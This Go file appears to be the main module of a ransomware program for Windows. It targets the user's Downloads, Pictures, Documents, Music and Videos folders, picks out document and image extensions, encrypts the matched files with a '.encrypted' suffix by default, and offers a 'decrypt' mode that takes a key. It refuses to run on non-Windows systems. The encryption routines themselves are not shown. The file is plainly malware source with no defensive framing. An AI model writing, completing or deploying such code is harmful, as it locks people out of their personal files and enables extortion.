//

package main

import (
	"fmt"
	"log"
	"os"
	"runtime"
)

var (
	InterestingDirs       = []string{"Downloads", "Pictures", "Music", "Documents", "Videos"}
	InterestingExtensions = []string{"docx", "png", "jpg", "pdf", "txt", "html"}
	MatchedFiles          = []string{}
	EncryptionExtension   = ".encrypted"
	BaseDir               = fmt.Sprintf("%s\\", os.Getenv("USERPROFILE"))
)

func main() {
	printBanner()

	checkOS()

	args := os.Args

	if len(args) < 2 {
		encryptFiles()

		// Wait for enter to exit
		var s string
		fmt.Scanf("%s", &s)
		return
	}

	switch args[1] {
	case "-h", "help", "h":
		usage("")
	case "decrypt":
		if len(args) != 3 {
			usage("Missing decryption key")
		}

		decryptFiles(os.Args[2])
	}

}

func checkOS() {
	if runtime.GOOS != "windows" {
		log.Fatalln("Sorry, but your OS is currently not supported. Try again with a windows machine")
	}
}
